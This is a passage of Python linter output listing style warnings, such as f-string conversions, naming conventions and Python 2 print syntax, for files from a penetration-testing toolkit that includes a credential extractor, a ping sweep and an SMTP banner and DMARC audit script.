301 |                 Logger.dbg("\tRegex used: [ {} ]".format(processedRex))
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
302 |     return num
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:308:17
    |
306 |     lines = []
307 |
308 |     Logger.info('Processing file: "{}"'.format(file))
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
309 |     try:
310 |         with open(file, "r") as f:
    |
help: Convert to f-string

UP015 [*] Unnecessary mode argument
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:310:25
    |
308 |     Logger.info('Processing file: "{}"'.format(file))
309 |     try:
310 |         with open(file, "r") as f:
    |                         ^^^
311 |             lines = [line.strip() for line in f.readlines()]
312 |     except Exception as e:
    |
help: Remove mode argument

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:313:20
    |
311 |             lines = [line.strip() for line in f.readlines()]
312 |     except Exception as e:
313 |         Logger.err("Parsing file '{}' failed: {}.".format(file, str(e)))
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
314 |         return 0
    |
help: Convert to f-string

B015 Pointless comparison. Did you mean to assign a value? Otherwise, prepend `assert` or remove it.
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:418:9
    |
416 |         config["format"] = "csv"
417 |     else:
418 |         config["format"] == "normal"
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
419 |
420 |     return args
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:448:20
    |
446 |                     longest = passwd
447 |
448 |             out += "{}\n".format(passwd)
    |                    ^^^^^^^^^^^^^^^^^^^^^
449 |         elif config["format"] == "csv":
450 |             creds = '"{}"'.format(creds)
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:450:21
    |
448 |             out += "{}\n".format(passwd)
449 |         elif config["format"] == "csv":
450 |             creds = '"{}"'.format(creds)
    |                     ^^^^^^^^^^^^^^^^^^^^
451 |             rex = rex.replace(config["csv_delimiter"], " ")
452 |             out += config["csv_delimiter"].join([file, technology, rex, creds])
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:455:20
    |
453 |             out += "\n"
454 |         else:
455 |             out += '[+] {}: {}: "{}"\n'.format(technology, rex, creds)
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
456 |
457 |         return out
    |
help: Convert to f-string

N806 Variable `outputToPrint` in function should be lowercase
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:473:5
    |
471 |     maxRegexpWidth = maxRegexpWidth + 3
472 |
473 |     outputToPrint = ""
    |     ^^^^^^^^^^^^^
474 |
475 |     if config["format"] == "normal" or config["format"] == "tabular":
    |

N806 Variable `outputToPrint` in function should be lowercase
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:476:9
    |
475 |     if config["format"] == "normal" or config["format"] == "tabular":
476 |         outputToPrint += "\n=== CREDENTIALS FOUND:\n"
    |         ^^^^^^^^^^^^^
477 |     elif config["format"] == "csv":
478 |         outputToPrint += config["csv_delimiter"].join(cols)
    |

N806 Variable `outputToPrint` in function should be lowercase
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:478:9
    |
476 |         outputToPrint += "\n=== CREDENTIALS FOUND:\n"
477 |     elif config["format"] == "csv":
478 |         outputToPrint += config["csv_delimiter"].join(cols)
    |         ^^^^^^^^^^^^^
479 |         outputToPrint += "\n"
    |

N806 Variable `outputToPrint` in function should be lowercase
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:479:9
    |
477 |     elif config["format"] == "csv":
478 |         outputToPrint += config["csv_delimiter"].join(cols)
479 |         outputToPrint += "\n"
    |         ^^^^^^^^^^^^^
480 |
481 |     resultsPerFile = {}
    |

N806 Variable `resultsPerFile` in function should be lowercase
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:481:5
    |
479 |         outputToPrint += "\n"
480 |
481 |     resultsPerFile = {}
    |     ^^^^^^^^^^^^^^
482 |     otherResultsPerFile = {}
483 |     for result in results:
    |

N806 Variable `otherResultsPerFile` in function should be lowercase
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:482:5
    |
481 |     resultsPerFile = {}
482 |     otherResultsPerFile = {}
    |     ^^^^^^^^^^^^^^^^^^^
483 |     for result in results:
484 |         file, technology, rex, creds = result
    |

SIM118 [*] Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:486:16
    |
484 |         file, technology, rex, creds = result
485 |         if technology == "Others":
486 |             if file not in otherResultsPerFile.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
487 |                 otherResultsPerFile[file] = []
488 |             otherResultsPerFile[file].append((technology, rex, creds))
    |
help: Remove `.keys()`

SIM118 [*] Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:490:16
    |
488 |             otherResultsPerFile[file].append((technology, rex, creds))
489 |         else:
490 |             if file not in resultsPerFile.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
491 |                 resultsPerFile[file] = []
492 |             resultsPerFile[file].append((technology, rex, creds))
    |
help: Remove `.keys()`

N806 Variable `outputToPrint` in function should be lowercase
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:496:13
    |
494 |     for file, _results in resultsPerFile.items():
495 |         if config["filename"] and config["format"] in ["raw", "normal", "tabular"]:
496 |             outputToPrint += '\nResults from file: "{}"\n'.format(file)
    |             ^^^^^^^^^^^^^
497 |         for result in _results:
498 |             technology, rex, creds = result
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:496:30
    |
494 |     for file, _results in resultsPerFile.items():
495 |         if config["filename"] and config["format"] in ["raw", "normal", "tabular"]:
496 |             outputToPrint += '\nResults from file: "{}"\n'.format(file)
    |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
497 |         for result in _results:
498 |             technology, rex, creds = result
    |
help: Convert to f-string

N806 Variable `outputToPrint` in function should be lowercase
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:499:13
    |
497 |         for result in _results:
498 |             technology, rex, creds = result
499 |             outputToPrint += _print(file, technology, rex, creds)
    |             ^^^^^^^^^^^^^
500 |
501 |     if not config["no_others"] and (
    |

N806 Variable `outputToPrint` in function should be lowercase
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:504:9
    |
502 |         config["format"] == "normal" or config["format"] == "tabular"
503 |     ):
504 |         outputToPrint += "\n\n=== BELOW LINES MAY BE FALSE POSITIVES:\n"
    |         ^^^^^^^^^^^^^
505 |
506 |     for file, _results in otherResultsPerFile.items():
    |

N806 Variable `outputToPrint` in function should be lowercase
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:508:13
    |
506 |     for file, _results in otherResultsPerFile.items():
507 |         if config["filename"] and config["format"] in ["raw", "normal", "tabular"]:
508 |             outputToPrint += '\nResults from file: "{}"\n'.format(file)
    |             ^^^^^^^^^^^^^
509 |         for result in _results:
510 |             technology, rex, creds = result
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:508:30
    |
506 |     for file, _results in otherResultsPerFile.items():
507 |         if config["filename"] and config["format"] in ["raw", "normal", "tabular"]:
508 |             outputToPrint += '\nResults from file: "{}"\n'.format(file)
    |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
509 |         for result in _results:
510 |             technology, rex, creds = result
    |
help: Convert to f-string

N806 Variable `outputToPrint` in function should be lowercase
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:511:13
    |
509 |         for result in _results:
510 |             technology, rex, creds = result
511 |             outputToPrint += _print(file, technology, rex, creds)
    |             ^^^^^^^^^^^^^
512 |
513 |     return outputToPrint
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:533:9
    |
532 |     Logger.info(
533 |         "Capable of matching: {} patterns containing credentials.".format(count)
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
534 |     )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:557:15
    |
556 |     if config["format"] == "normal" or config["format"] == "tabular":
557 |         print("\n[>] Found: {} credentials.".format(num))
    |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |
help: Convert to f-string

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\pingsweep.py:13:11
   |
12 | if __name__ == '__main__':
13 |     print '\tQuick Ping Sweep\n'
   |           ^^^^^^^^^^^^^^^^^^^^^^
14 |
15 |     if len(sys.argv) != 2:
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\pingsweep.py:16:15
   |
15 |     if len(sys.argv) != 2:
16 |         print '[?] Usage: pingsweep <network>'
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
17 |         sys.exit(0)
   |

W293 Blank line contains whitespace
  --> security\penetration-testing-tools\networks\pingsweep.py:18:1
   |
16 |         print '[?] Usage: pingsweep <network>'
17 |         sys.exit(0)
18 |     
   | ^^^^
19 |     net = sys.argv[1]
20 |     print 'Input network:', net
   |
help: Remove whitespace from blank line

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\pingsweep.py:20:11
   |
19 |     net = sys.argv[1]
20 |     print 'Input network:', net
   |           ^^^^^^^^^^^^^^^^
21 |
22 |     responding = []
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\pingsweep.py:36:19
   |
35 |         if int(reply.getlayer(ICMP).type) == 0 and int(reply.getlayer(ICMP).code) == 0:
36 |             print ip, ': Host is responding to ICMP Echo Requests.'
   |                   ^^
37 |             responding.append(ip)
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\pingsweep.py:39:11
   |
37 |             responding.append(ip)
38 |
39 |     print '[+] Spotted {} ICMP Echo Requests.'.format(len(responding))
   |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

W292 No newline at end of file
  --> security\penetration-testing-tools\networks\pingsweep.py:39:71
   |
37 |             responding.append(ip)
38 |
39 |     print '[+] Spotted {} ICMP Echo Requests.'.format(len(responding))
   |                                                                       ^
   |
help: Add trailing newline

N801 Class name `colors` should use CapWords convention
   --> security\penetration-testing-tools\networks\smtpAudit.py:180:7
    |
180 | class colors:
    |       ^^^^^^
181 |     """Colors class:
182 |     reset all colors with colors.reset
    |

N801 Class name `fg` should use CapWords convention
   --> security\penetration-testing-tools\networks\smtpAudit.py:199:11
    |
197 |     invisible = "\033[08m"
198 |
199 |     class fg:
    |           ^^
200 |         black = "\033[30m"
201 |         red = "\033[31m"
    |

N801 Class name `bg` should use CapWords convention
   --> security\penetration-testing-tools\networks\smtpAudit.py:216:11
    |
214 |         lightcyan = "\033[96m"
215 |
216 |     class bg:
    |           ^^
217 |         black = "\033[40m"
218 |         red = "\033[41m"
    |

N803 Argument name `toOutLine` should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:230:13
    |
228 | # Output routines.
229 | #
230 | def _out(x, toOutLine=False, col=colors.reset):
    |             ^^^^^^^^^^^^^^^
231 |     if config["colors"]:
232 |         text = "{}{}{}\n".format(col, x, colors.reset)
    |

SIM108 Use ternary operator `text = "{}{}{}\n".format(col, x, colors.reset) if config["colors"] else x + "\n"` instead of `if`-`else`-block
   --> security\penetration-testing-tools\networks\smtpAudit.py:231:5
    |
229 |   #
230 |   def _out(x, toOutLine=False, col=colors.reset):
231 | /     if config["colors"]:
232 | |         text = "{}{}{}\n".format(col, x, colors.reset)
233 | |     else:
234 | |         text = x + "\n"
    | |_______________________^
235 |
236 |       if config["debug"] or config["verbose"]:
    |
help: Replace `if`-`else`-block with `text = "{}{}{}\n".format(col, x, colors.reset) if config["colors"] else x + "\n"`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:232:16
    |
230 | def _out(x, toOutLine=False, col=colors.reset):
231 |     if config["colors"]:
232 |         text = "{}{}{}\n".format(col, x, colors.reset)
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
233 |     else:
234 |         text = x + "\n"
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:256:18
    |
254 |         caller2 = (inspect.getouterframes(inspect.currentframe(), 2))[1][3]
255 |         caller1 = (inspect.getouterframes(inspect.currentframe(), 2))[2][3]
256 |         caller = "{}() -> {}".format(caller1, caller2)
    |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
257 |         text = x
258 |         if config["colors"]:
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:259:20
    |
257 |         text = x
258 |         if config["colors"]:
259 |             text = "{}{}{}".format(colors.fg.lightblue, x, colors.reset)
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
260 |         sys.stderr.write("[dbg] " + caller + "(): " + text + "\n")
    |
help: Convert to f-string

N803 Argument name `toOutLine` should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:263:12
    |
263 | def out(x, toOutLine=False):
    |            ^^^^^^^^^^^^^^^
264 |     _out("[.] " + x, toOutLine)
    |

N803 Argument name `toOutLine` should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:267:13
    |
267 | def info(x, toOutLine=False):
    |             ^^^^^^^^^^^^^^^
268 |     _out("[?] " + x, toOutLine, colors.fg.yellow)
    |

N803 Argument name `toOutLine` should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:271:12
    |
271 | def err(x, toOutLine=False):
    |            ^^^^^^^^^^^^^^^
272 |     _out("[!] " + x, toOutLine, colors.bg.red + colors.fg.black)
    |

N803 Argument name `toOutLine` should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:275:13
    |
275 | def fail(x, toOutLine=False):
    |             ^^^^^^^^^^^^^^^
276 |     _out("[-] " + x, toOutLine, colors.fg.red + colors.bold)
    |

N803 Argument name `toOutLine` should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:279:11
    |
279 | def ok(x, toOutLine=False):
    |           ^^^^^^^^^^^^^^^
280 |     _out("[+] " + x, toOutLine, colors.fg.green + colors.bold)
    |

N815 Variable `softwareWeight` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:284:5
    |
283 | class BannerParser:
284 |     softwareWeight = 3
    |     ^^^^^^^^^^^^^^
285 |     osWeight = 2
    |

N815 Variable `osWeight` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:285:5
    |
283 | class BannerParser:
284 |     softwareWeight = 3
285 |     osWeight = 2
    |     ^^^^^^^^
286 |
287 |     # MTAs
    |

N815 Variable `prohibitedSoftwareWords` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:288:5
    |
287 |     # MTAs
288 |     prohibitedSoftwareWords = (
    |     ^^^^^^^^^^^^^^^^^^^^^^^
289 |         "Exim",
290 |         "Postfix",
    |

N815 Variable `prohibitedOSWords` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:298:5
    |
296 |     )
297 |
298 |     prohibitedOSWords = (
    |     ^^^^^^^^^^^^^^^^^
299 |         "Windows",
300 |         "Linux",
    |

N815 Variable `prohibitedWords` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:315:5
    |
313 |     # Certain words will have greater weight since they are more important to hide in banner.
314 |     # Every word must be in it's own list.
315 |     prohibitedWords = (
    |     ^^^^^^^^^^^^^^^
316 |         prohibitedSoftwareWords
317 |         + prohibitedOSWords
    |

N815 Variable `wellKnownDefaultBanners` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:329:5
    |
327 |     )
328 |
329 |     wellKnownDefaultBanners = {
    |     ^^^^^^^^^^^^^^^^^^^^^^^
330 |         "Microsoft Exchange": "Microsoft ESMTP MAIL service ready at ",
331 |         "IBM Lotus Domino": "ESMTP Service (Lotus Domino ",
    |

N815 Variable `lengthCharacteristics` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:335:5
    |
334 |     # Statistical banner's length characteristics
335 |     lengthCharacteristics = {"mean": 66.08, "median": 58.5, "std.dev": 27.27}
    |     ^^^^^^^^^^^^^^^^^^^^^
336 |
337 |     # Reduced entropy statistical characteristics after removing potential timestamp
    |

N815 Variable `reducedEntropyCharacteristics` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:339:5
    |
337 |     # Reduced entropy statistical characteristics after removing potential timestamp
338 |     # (as being added by e.g. Exim and Exchange)
339 |     reducedEntropyCharacteristics = {
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
340 |         "mean": 3.171583046,
341 |         "median": 3.203097614,
    |

N815 Variable `maxPenaltyScore` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:352:5
    |
351 |     # Max penalty score to consider banner unsecure.
352 |     maxPenaltyScore = 4.0
    |     ^^^^^^^^^^^^^^^
353 |
354 |     localHostnameRegex = r"(?:[0-9]{3}\s)?([\w\-\.]+).*"
    |

N815 Variable `localHostnameRegex` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:354:5
    |
352 |     maxPenaltyScore = 4.0
353 |
354 |     localHostnameRegex = r"(?:[0-9]{3}\s)?([\w\-\.]+).*"
    |     ^^^^^^^^^^^^^^^^^^
355 |
356 |     def __init__(self):
    |

N806 Variable `versionFound` in function should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:401:9
    |
400 |         penalty = 0
401 |         versionFound = ""
    |         ^^^^^^^^^^^^
402 |
403 |         for service, wellKnownBanner in BannerParser.wellKnownDefaultBanners.items():
    |

F841 Local variable `versionFound` is assigned to but never used
   --> security\penetration-testing-tools\networks\smtpAudit.py:401:9
    |
400 |         penalty = 0
401 |         versionFound = ""
    |         ^^^^^^^^^^^^
402 |
403 |         for service, wellKnownBanner in BannerParser.wellKnownDefaultBanners.items():
    |
help: Remove assignment to unused variable `versionFound`

N806 Variable `wellKnownBanner` in function should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:403:22
    |
401 |         versionFound = ""
402 |
403 |         for service, wellKnownBanner in BannerParser.wellKnownDefaultBanners.items():
    |                      ^^^^^^^^^^^^^^^
404 |             if wellKnownBanner.lower() in banner.lower():
405 |                 fail(
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:406:21
    |
404 |               if wellKnownBanner.lower() in banner.lower():
405 |                   fail(
406 | /                     'UNSECURE: Default banner found for {}: "{}"'.format(
407 | |                         service, banner
408 | |                     )
    | |_____________________^
409 |                   )
410 |               return False
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:419:17
    |
417 |           if not ret:
418 |               fail(
419 | /                 "UNSECURE: Banner considered revealing sensitive informations (penalty: {}/{})!".format(
420 | |                     penalty, BannerParser.maxPenaltyScore
421 | |                 )
    | |_________________^
422 |               )
423 |               _out('\tBanner: ("{}")'.format(banner), toOutLine=True)
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:423:18
    |
421 |                 )
422 |             )
423 |             _out('\tBanner: ("{}")'.format(banner), toOutLine=True)
    |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
424 |
425 |             return self.results
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:428:17
    |
426 |           else:
427 |               ok(
428 | /                 "SECURE: Banner was not found leaking anything. (penalty: {}/{})".format(
429 | |                     penalty, BannerParser.maxPenaltyScore
430 | |                 )
    | |_________________^
431 |               )
432 |               _out('\tBanner: ("{}")'.format(banner), toOutLine=True)
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:432:18
    |
430 |                 )
431 |             )
432 |             _out('\tBanner: ("{}")'.format(banner), toOutLine=True)
    |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
433 |
434 |             if all(self.results.values()) and not config["always_unfolded_results"]:
    |
help: Convert to f-string

N806 Variable `reducedBanner` in function should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:441:9
    |
439 |     def analyseBannerEntropy(self, banner):
440 |         penalty = 0
441 |         reducedBanner = BannerParser.removeTimestamp(banner)
    |         ^^^^^^^^^^^^^
442 |         bannerEntropy = BannerParser.entropy(reducedBanner)
    |

N806 Variable `bannerEntropy` in function should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:442:9
    |
440 |         penalty = 0
441 |         reducedBanner = BannerParser.removeTimestamp(banner)
442 |         bannerEntropy = BannerParser.entropy(reducedBanner)
    |         ^^^^^^^^^^^^^
443 |
444 |         dbg('Analysing banner: "{}"'.format(banner))
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:444:13
    |
442 |         bannerEntropy = BannerParser.entropy(reducedBanner)
443 |
444 |         dbg('Analysing banner: "{}"'.format(banner))
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
445 |         dbg(
446 |             "Length: {}, reduced banner Entropy: {:.6f}".format(
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:446:13
    |
444 |           dbg('Analysing banner: "{}"'.format(banner))
445 |           dbg(
446 | /             "Length: {}, reduced banner Entropy: {:.6f}".format(
447 | |                 len(banner), bannerEntropy
448 | |             )
    | |_____________^
449 |           )
    |
help: Convert to f-string

N806 Variable `versionFound` in function should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:478:9
    |
476 |     def checkForProhibitedWordsAndVersion(self, banner):
477 |         penalty = 0
478 |         versionFound = ""
    |         ^^^^^^^^^^^^
479 |         regexVersionNumber = r"(?:(\d+)\.)?(?:(\d+)\.)?(?:(\d+)\.\d+)"
    |

N806 Variable `regexVersionNumber` in function should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:479:9
    |
477 |         penalty = 0
478 |         versionFound = ""
479 |         regexVersionNumber = r"(?:(\d+)\.)?(?:(\d+)\.)?(?:(\d+)\.\d+)"
    |         ^^^^^^^^^^^^^^^^^^
480 |
481 |         match = re.search(regexVersionNumber, banner)
    |

N806 Variable `versionFound` in function should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:483:13
    |
481 |         match = re.search(regexVersionNumber, banner)
482 |         if match:
483 |             versionFound = match.group(0)
    |             ^^^^^^^^^^^^
484 |             fail(
485 |                 'Sensitive software version number found in banner: "{}"'.format(
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:485:17
    |
483 |               versionFound = match.group(0)
484 |               fail(
485 | /                 'Sensitive software version number found in banner: "{}"'.format(
486 | |                     versionFound
487 | |                 ),
    | |_________________^
488 |                   toOutLine=True,
489 |               )
    |
help: Convert to f-string

N806 Variable `alreadyFound` in function should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:493:9
    |
491 |             penalty += BannerParser.weights["versionFound"]
492 |
493 |         alreadyFound = set()
    |         ^^^^^^^^^^^^
494 |         for word in BannerParser.prohibitedWords:
495 |             if word.lower() in banner.lower():
    |

E713 [*] Test for membership should be `not in`
   --> security\penetration-testing-tools\networks\smtpAudit.py:496:24
    |
494 |         for word in BannerParser.prohibitedWords:
495 |             if word.lower() in banner.lower():
496 |                 if not word.lower() in alreadyFound:
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
497 |                     info(
498 |                         'Prohibited word found in banner: "{}"'.format(word),
    |
help: Convert to `not in`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:498:25
    |
496 |                 if not word.lower() in alreadyFound:
497 |                     info(
498 |                         'Prohibited word found in banner: "{}"'.format(word),
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
499 |                         toOutLine=True,
500 |                     )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:515:25
    |
513 |                 if versionFound:
514 |                     surrounds = (
515 |                         "{}{}".format(word, versionFound),
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
516 |                         "{}{}".format(versionFound, word),
517 |                         "{} {}".format(word, versionFound),
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:516:25
    |
514 |                     surrounds = (
515 |                         "{}{}".format(word, versionFound),
516 |                         "{}{}".format(versionFound, word),
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
517 |                         "{} {}".format(word, versionFound),
518 |                         "{} {}".format(versionFound, word),
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:517:25
    |
515 |                         "{}{}".format(word, versionFound),
516 |                         "{}{}".format(versionFound, word),
517 |                         "{} {}".format(word, versionFound),
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
518 |                         "{} {}".format(versionFound, word),
519 |                         "{}/{}".format(word, versionFound),
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:518:25
    |
516 |                         "{}{}".format(versionFound, word),
517 |                         "{} {}".format(word, versionFound),
518 |                         "{} {}".format(versionFound, word),
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
519 |                         "{}/{}".format(word, versionFound),
520 |                         "{}/{}".format(versionFound, word),
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:519:25
    |
517 |                         "{} {}".format(word, versionFound),
518 |                         "{} {}".format(versionFound, word),
519 |                         "{}/{}".format(word, versionFound),
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
520 |                         "{}/{}".format(versionFound, word),
521 |                     )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:520:25
    |
518 |                         "{} {}".format(versionFound, word),
519 |                         "{}/{}".format(word, versionFound),
520 |                         "{}/{}".format(versionFound, word),
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
521 |                     )
522 |                     for surr in surrounds:
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:525:33
    |
523 |                           if surr in banner:
524 |                               info(
525 | /                                 'Word was found lying around version: "{}". '
526 | |                                 "Consider removing it.".format(surr),
    | |____________________________________________________________________^
527 |                                   toOutLine=True,
528 |                               )
    |
help: Convert to f-string

N806 Variable `localHostname` in function should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:539:13
    |
538 |         if matched:
539 |             localHostname = matched.group(1)
    |             ^^^^^^^^^^^^^
540 |             self.results["contains-hostname"] = True
541 |             info('Extracted hostname from banner: "{}"'.format(localHostname))
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:541:18
    |
539 |             localHostname = matched.group(1)
540 |             self.results["contains-hostname"] = True
541 |             info('Extracted hostname from banner: "{}"'.format(localHostname))
    |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
542 |         else:
543 |             fail(
    |
help: Convert to f-string

N806 Variable `keyValue` in function should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:567:13
    |
565 |                 return None
566 |
567 |         for keyValue in record.split(" "):
    |             ^^^^^^^^
568 |             if not keyValue:
569 |                 break
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:580:26
    |
578 |                 self.results["dmarc-version"] = v.lower() == "dmarc1"
579 |                 if not self.results["dmarc-version"]:
580 |                     fail("UNSECURE: Unknown version of DMARC stated: {}".format(v))
    |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
581 |
582 |             elif k == "p":
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:584:26
    |
582 |             elif k == "p":
